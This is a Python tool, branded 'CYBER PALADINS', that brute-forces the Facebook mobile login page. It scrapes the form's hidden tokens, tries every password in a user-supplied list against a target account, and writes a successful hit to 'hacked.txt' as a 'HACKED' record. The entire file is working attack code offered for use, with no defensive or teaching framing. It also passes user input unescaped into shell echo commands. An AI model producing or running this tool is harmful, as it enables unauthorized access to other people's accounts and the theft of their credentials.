import os
import sys
import requests
import datetime
from bs4 import BeautifulSoup as bs

url = 'https://n.facebook.com'
xurl = url + '/login.php'

ua = "Mozilla/5.0 (Linux; Android 4.1.2; GT-I8552 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36"
current_time = datetime.datetime.now().time()
formatted_time = current_time.strftime("%H:%M:%S")

# logo configuration
logo = ("""
  \033[1;31m███████\033[1;32m███████
  \033[1;31m██ ⠀⢀⣠⣤⣤⣄⡀⠀ \033[1;32m██
  \033[1;31m██ ⣴⣿⣿⣿⣿⣿⣿⣦ \033[1;32m██ \033[1;0m[\033[1;31mBRUTE\033[1;0m] \033[1;32mZ3R0 TR4C3 \033[1;31m║
  \033[1;33m██ ⣿⣿⣿⣿⣿⣿⣿⣿ \033[1;32m██ \033[1;0m[\033[1;31mBRUTE\033[1;0m] \033[1;32mC PALADINS \033[1;31m║
  \033[1;33m██ ⣇⠈⠉⡿⢿⠉⠁⢸ \033[1;32m██ \033[1;0m[\033[1;31mBRUTE\033[1;0m] \033[1;32mBRUTEFORCE \033[1;31m║
  \033[1;33m██ ⠙⠛⢻⣷⣾⡟⠛⠋ \033[1;31m██ \033[1;0m[\033[1;31mBRUTE\033[1;0m] \033[1;32m{}   \033[1;31m║
  \033[1;33m██  \033[1;31m ⠀⠈⠁⠀⠀⠀ \033[1;31m██
  \033[1;33m███████\033[1;31m███████

  \033[1;32m═══════════════════════════════════\033[1;31m
""")
os.system("clear")
print(logo.format(formatted_time))

def login():
   # banner()
    try:
        user = input('  [✦] \033[1;32mEMAIL / PHONE / ID :\033[1;33m ')
        password_file = input('  \033[1;31m[✦] \033[1;32mPASSLIST\033[2;31m pass.txt \033[0m:\033[1;33m ')
        print()
        with open(password_file, 'r') as file:
            passwords = file.readlines()

        
        req = requests.Session()
        req.headers.update({
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-language': 'en', 'cache-control': 'max-age=0',
            'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
            'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': "Windows",
            'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1',
            'user-agent': ua})
        
        with req.get(url) as response_body:
            inspect = bs(response_body.text, 'html.parser')
            lsd_key = inspect.find('input', {'name': 'lsd'})['value']
            jazoest_key = inspect.find('input', {'name': 'jazoest'})['value']
            m_ts_key = inspect.find('input', {'name': 'm_ts'})['value']
            li_key = inspect.find('input', {'name': 'li'})['value']
            try_number_key = inspect.find('input', {'name': 'try_number'})['value']
            unrecognized_tries_key = inspect.find('input', {'name': 'unrecognized_tries'})['value']
            bi_xrwh_key = inspect.find('input', {'name': 'bi_xrwh'})['value']
            
            for password in passwords:
                password = password.strip()  # Remove leading/trailing whitespace
                data = {
                    'lsd': lsd_key, 'jazoest': jazoest_key,
                    'm_ts': m_ts_key, 'li': li_key,
                    'try_number': try_number_key,
                    'unrecognized_tries': unrecognized_tries_key,
                    'bi_xrwh': bi_xrwh_key, 'email': user,
                    'pass': password, 'login': "submit"}
                print(f'  \033[1;33m[\033[1;0m$\033[1;33m] \033[1;31mBRUTE : \033[1;32m{password}')
                response_body2 = req.post(xurl, data=data, allow_redirects=True, timeout=300)
                cookie = str(req.cookies.get_dict())[1:-1].replace("'", "").replace(",", ";").replace(":", "=")
                if 'checkpoint' in cookie:
                    print(" " * 1 + "═" * 35)
                    sys.exit(f"  [x] \033[1;31mCHECK POINT : {password}\033[0m")
                elif 'c_user' in cookie:
                   #print(f'\n   [\033[38;5;83mCOOKIES\033[0m] \033[38;5;208m{cookie}\033[0m\n\n')
                    #open('cookies.txt', 'a').write(f'[Cookie] - {cookie}\n\n')
                    #open('cookie.log', 'w').write(cookie)
                    print(" " * 1 + "═" * 35)
                    print(f"\033[1;31m   [+] \033[1;0mCHECKPOINT : \033[1;33mBYPASSED √")
                    print(f'\033[1;31m   [+] \033[1;0mCREDENTIAL : \033[1;32m{user}')
                    print(f'\033[1;31m   [+] \033[1;0mPASSWORD   : \033[1;32m{password}')
                    print(" " * 1 + "═" * 35)
                    os.system("mpv .alert.mp3 2>/dev/null >/dev/null")
                    print("  [✓] SAVED TO : hacked.txt")
                    os.system('echo ' " [HACKED BY CYBER PALADINS TEAM" '>> hacked.txt')
                    os.system('echo ' "PHONE : {}" '>> hacked.txt'.format(user))
                    os.system('echo ' "PASS : {}" '>> hacked.txt'.format(password))
                    os.system('echo ' "" '>> hacked.txt')
                    os.system('echo ' "" '>> hacked.txt')
                    os.system('echo ' "" '>> hacked.txt')
                    os.system("sleep 2")
                    print("")
                    os.system("sleep 1")
                    os.system("espeak -v en-us+f6 'Thank You For Using My Tool!.'")
                    os.system("sleep 3")
                    break  # Exit the loop if the correct password is found
            else:
                sys.exit("\033[38;5;208m   [x] Valid Password Not Found!\033[0m")
    
    except requests.exceptions.ConnectionError:
        sys.exit(' [+] No internet Connection')
    except KeyboardInterrupt:
        sys.exit(" [+] TOOL STOPPED!")


login()
